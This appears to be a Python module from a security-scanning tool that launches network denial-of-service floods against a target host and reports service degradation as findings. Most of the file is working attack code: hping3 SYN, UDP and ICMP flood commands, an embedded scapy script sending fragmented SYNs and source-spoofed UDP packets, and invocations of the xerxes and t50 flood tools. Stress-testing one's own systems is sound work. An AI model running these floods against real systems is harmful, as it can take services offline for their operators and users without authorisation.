"""
Network Flood module — Phase 9.3 (Layer 4).
Tools: hping3 (SYN/UDP/ICMP flood), scapy (custom packets),
       xerxes (TCP connection flood), t50 (multi-protocol injector).
Requires NET_ADMIN + NET_RAW capabilities in Docker container.
Only runs on scan_type == 'full'.
"""
from __future__ import annotations

import asyncio
import re
import shutil
import time
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult, run_cmd

if TYPE_CHECKING:
    from app.scanner.context import ScanContext

_DEFAULT_DURATION = 15   # seconds per attack vector
_DEFAULT_PORT     = 80


# ── Capability check ──────────────────────────────────────────────────────────

def _has_raw_capability() -> bool:
    """Check if process has NET_RAW capability (required for hping3/scapy)."""
    try:
        cap_path = "/proc/self/status"
        with open(cap_path) as f:
            for line in f:
                if line.startswith("CapEff:"):
                    cap_hex = int(line.split(":")[1].strip(), 16)
                    # NET_RAW = bit 13 (0x2000), NET_ADMIN = bit 12 (0x1000)
                    return bool(cap_hex & 0x2000)
    except Exception:
        pass
    return shutil.which("hping3") is not None


def _get_target_port(nmap_findings: list[Finding]) -> int:
    """Pick the most prominent open port from nmap findings."""
    for port in (80, 443, 22, 21, 25, 3306, 5432, 8080, 8443):
        if any(f.port == port for f in nmap_findings if f.port):
            return port
    # Fall back to first open port found
    for f in nmap_findings:
        if f.port:
            return f.port
    return _DEFAULT_PORT


def _extract_ip(target: str) -> str:
    """Strip scheme/path from target to get bare IP or hostname."""
    target = re.sub(r"^https?://", "", target)
    return target.split("/")[0].split(":")[0]


# ── hping3 floods ─────────────────────────────────────────────────────────────

async def _run_hping3(
    ctx: "ScanContext",
    target_ip: str,
    port: int,
    mode: str,          # "syn" | "udp" | "icmp"
    duration: int,
) -> tuple[int, str, str]:
    if not shutil.which("hping3"):
        return -1, "", "hping3 not found"

    mode_flags = {
        "syn":  ["-S", "--flood", "-p", str(port)],
        "udp":  ["--udp", "--flood", "-p", str(port)],
        "icmp": ["-1", "--flood"],
    }
    flags = mode_flags.get(mode, mode_flags["syn"])

    await ctx.log(
        f"ddos_network: hping3 {mode.upper()} flood → {target_ip}:{port} for {duration}s",
        module="ddos_network",
    )

    # hping3 --flood runs indefinitely; wrap with timeout
    cmd = ["hping3"] + flags + [target_ip]
    return run_cmd(cmd, timeout=duration)


def _parse_hping3(output: str, mode: str) -> tuple[int, int]:
    """Return (packets_sent, packets_recv) from hping3 output."""
    sent_m  = re.search(r"(\d+)\s+packets\s+transmitted", output, re.IGNORECASE)
    recv_m  = re.search(r"(\d+)\s+packets\s+received",   output, re.IGNORECASE)
    sent = int(sent_m.group(1)) if sent_m else 0
    recv = int(recv_m.group(1)) if recv_m else 0
    return sent, recv


# ── scapy custom packets ──────────────────────────────────────────────────────

_SCAPY_SCRIPT = """
import sys, time
from scapy.all import IP, TCP, UDP, ICMP, send, RandShort, RandIP

target = sys.argv[1]
port   = int(sys.argv[2])
dur    = int(sys.argv[3])
mode   = sys.argv[4]   # syn_frag | udp_spoof | icmp_frag

t0 = time.time()
count = 0
while time.time() - t0 < dur:
    if mode == "syn_frag":
        pkt = IP(dst=target, flags="MF", frag=0) / TCP(dport=port, flags="S", seq=RandShort())
    elif mode == "udp_spoof":
        pkt = IP(dst=target, src=RandIP()) / UDP(dport=port, sport=RandShort())
    elif mode == "icmp_frag":
        pkt = IP(dst=target, flags="MF") / ICMP() / (b"X" * 512)
    else:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
    send(pkt, verbose=0, count=10)
    count += 10

print(f"scapy: sent {count} packets ({mode})")
"""


async def _run_scapy(
    ctx: "ScanContext",
    target_ip: str,
    port: int,
    mode: str,
    duration: int,
) -> tuple[int, str, str]:
    try:
        import importlib.util
        if importlib.util.find_spec("scapy") is None:
            return -1, "", "scapy not installed"
    except Exception:
        return -1, "", "scapy not installed"

    import tempfile
    from pathlib import Path

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(_SCAPY_SCRIPT)
        script = f.name

    await ctx.log(
        f"ddos_network: scapy {mode} → {target_ip}:{port} for {duration}s",
        module="ddos_network",
    )

    try:
        rc, out, err = run_cmd(
            ["python3", script, target_ip, str(port), str(duration), mode],
            timeout=duration + 10,
        )
    finally:
        Path(script).unlink(missing_ok=True)

    return rc, out, err


# ── xerxes TCP connection flood ───────────────────────────────────────────────

async def _run_xerxes(
    ctx: "ScanContext",
    target_ip: str,
    port: int,
    duration: int,
) -> tuple[int, str, str]:
    xerxes = shutil.which("xerxes")
    if not xerxes:
        for p in ["/opt/xerxes/xerxes", "/usr/local/bin/xerxes"]:
            import pathlib
            if pathlib.Path(p).exists():
                xerxes = p
                break

    if not xerxes:
        return -1, "", "xerxes not found"

    await ctx.log(
        f"ddos_network: xerxes TCP flood → {target_ip}:{port} for {duration}s",
        module="ddos_network",
    )
    return run_cmd([xerxes, target_ip, str(port)], timeout=duration)


# ── t50 multi-protocol injector ───────────────────────────────────────────────

async def _run_t50(
    ctx: "ScanContext",
    target_ip: str,
    duration: int,
) -> tuple[int, str, str]:
    if not shutil.which("t50"):
        return -1, "", "t50 not found"

    await ctx.log(
        f"ddos_network: t50 multi-protocol flood → {target_ip} for {duration}s",
        module="ddos_network",
    )

    # t50: randomize protocols, flood mode
    cmd = [
        "t50", target_ip,
        "--flood",
        "--turbo",
        "--protocol", "RANDOM",
        "--threshold", "1000",
    ]
    return run_cmd(cmd, timeout=duration)


# ── TCP port availability probe ───────────────────────────────────────────────

async def _tcp_probe(host: str, port: int, timeout: float = 3.0) -> tuple[bool, float | None]:
    t0 = time.monotonic()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return True, (time.monotonic() - t0) * 1000
    except Exception:
        return False, None


# ── Finding builder ───────────────────────────────────────────────────────────

def _make_finding(
    target: str,
    attack: str,
    port: int,
    duration: int,
    packets_sent: int,
    baseline_ms: float | None,
    post_ms: float | None,
    service_up: bool,
    extra: str = "",
) -> Finding:
    if not service_up:
        severity, cvss = "critical", 7.5
        impact = "Service became unreachable after attack"
    elif baseline_ms and post_ms and post_ms > baseline_ms * 5:
        severity, cvss = "high", 6.5
        impact = f"Severe latency degradation ({baseline_ms:.0f}ms → {post_ms:.0f}ms)"
    elif baseline_ms and post_ms and post_ms > baseline_ms * 2:
        severity, cvss = "medium", 5.3
        impact = f"Moderate latency increase ({baseline_ms:.0f}ms → {post_ms:.0f}ms)"
    else:
        severity, cvss = "medium", 4.3
        impact = "Service remained available"

    pps = packets_sent // duration if duration else 0

    return Finding(
        type="ddos",
        title=f"Network flood ({attack}): {impact[:60]}",
        severity=severity,
        description=(
            f"Layer-4 {attack} flood test against {target}:{port} for {duration}s.\n\n"
            f"Packets sent:    {packets_sent:,}\n"
            f"Rate:            ~{pps:,} pps\n"
            f"Baseline RTT:    {f'{baseline_ms:.0f}ms' if baseline_ms else 'N/A'}\n"
            f"Post-attack RTT: {f'{post_ms:.0f}ms' if post_ms else 'unreachable'}\n"
            f"Service status:  {'UP' if service_up else 'DOWN'}\n"
            f"Impact:          {impact}"
            + (f"\n\n{extra[:300]}" if extra else "")
        ),
        evidence=(
            f"attack={attack} target={target}:{port} duration={duration}s "
            f"pkts={packets_sent} pps={pps} service_up={service_up}"
        ),
        remediation=(
            "Enable SYN cookies on the server (sysctl net.ipv4.tcp_syncookies=1). "
            "Configure upstream DDoS scrubbing (Cloudflare Magic Transit, AWS Shield Advanced). "
            "Set iptables rate limits: iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT. "
            "Enable TCP backlog tuning: sysctl net.core.somaxconn=65535. "
            "For UDP/ICMP: rate-limit with iptables -m limit or deploy BPF/XDP filters."
        ),
        cvss_score=cvss,
    )


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_ddos_network(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    nmap_findings: list[Finding],
    duration: int = _DEFAULT_DURATION,
) -> ScanResult:
    result = ScanResult()

    if scan_type != "full":
        return result

    if not _has_raw_capability():
        await ctx.log(
            "ddos_network: NET_RAW capability not available — skipping Layer-4 floods",
            level="warning", module="ddos_network",
        )
        result.errors.append("NET_RAW capability required for Layer-4 floods")
        return result

    target_ip = _extract_ip(target)
    port      = _get_target_port(nmap_findings)

    # Baseline TCP probe
    baseline_up, baseline_ms = await _tcp_probe(target_ip, port)
    if not baseline_up:
        await ctx.log(
            f"ddos_network: {target_ip}:{port} unreachable before test",
            level="warning", module="ddos_network",
        )
        result.errors.append(f"target unreachable: {target_ip}:{port}")
        return result

    await ctx.log(
        f"ddos_network: baseline TCP {target_ip}:{port} = {baseline_ms:.0f}ms",
        module="ddos_network",
    )

    # ── hping3 SYN flood ──
    rc, out, err = await _run_hping3(ctx, target_ip, port, "syn", duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        sent, _ = _parse_hping3(out + err, "syn")
        result.findings.append(_make_finding(
            target, "hping3 SYN flood", port, duration,
            sent, baseline_ms, post_ms if post_up else None, post_up,
        ))
    await asyncio.sleep(5)

    # ── hping3 UDP flood ──
    rc, out, err = await _run_hping3(ctx, target_ip, port, "udp", duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        sent, _ = _parse_hping3(out + err, "udp")
        result.findings.append(_make_finding(
            target, "hping3 UDP flood", port, duration,
            sent, baseline_ms, post_ms if post_up else None, post_up,
        ))
    await asyncio.sleep(5)

    # ── hping3 ICMP flood ──
    rc, out, err = await _run_hping3(ctx, target_ip, port, "icmp", duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        sent, _ = _parse_hping3(out + err, "icmp")
        result.findings.append(_make_finding(
            target, "hping3 ICMP flood", port, duration,
            sent, baseline_ms, post_ms if post_up else None, post_up,
        ))
    await asyncio.sleep(5)

    # ── scapy SYN fragmentation ──
    rc, out, err = await _run_scapy(ctx, target_ip, port, "syn_frag", duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        count_m = re.search(r"sent\s+(\d+)", out + err)
        sent = int(count_m.group(1)) if count_m else 0
        result.findings.append(_make_finding(
            target, "scapy SYN+frag", port, duration,
            sent, baseline_ms, post_ms if post_up else None, post_up,
            extra=out[:200],
        ))
    await asyncio.sleep(5)

    # ── scapy UDP spoofed ──
    rc, out, err = await _run_scapy(ctx, target_ip, port, "udp_spoof", duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        count_m = re.search(r"sent\s+(\d+)", out + err)
        sent = int(count_m.group(1)) if count_m else 0
        result.findings.append(_make_finding(
            target, "scapy UDP spoof", port, duration,
            sent, baseline_ms, post_ms if post_up else None, post_up,
        ))
    await asyncio.sleep(5)

    # ── xerxes TCP connection flood ──
    rc, out, err = await _run_xerxes(ctx, target_ip, port, duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        result.findings.append(_make_finding(
            target, "xerxes TCP flood", port, duration,
            0, baseline_ms, post_ms if post_up else None, post_up,
            extra=(out + err)[:200],
        ))
    await asyncio.sleep(5)

    # ── t50 multi-protocol ──
    rc, out, err = await _run_t50(ctx, target_ip, duration)
    post_up, post_ms = await _tcp_probe(target_ip, port)
    if rc != -1:
        result.findings.append(_make_finding(
            target, "t50 multi-protocol", port, duration,
            0, baseline_ms, post_ms if post_up else None, post_up,
            extra=(out + err)[:200],
        ))

    total = len(result.findings)
    await ctx.log(f"ddos_network: completed — {total} finding(s)", module="ddos_network")
    return result
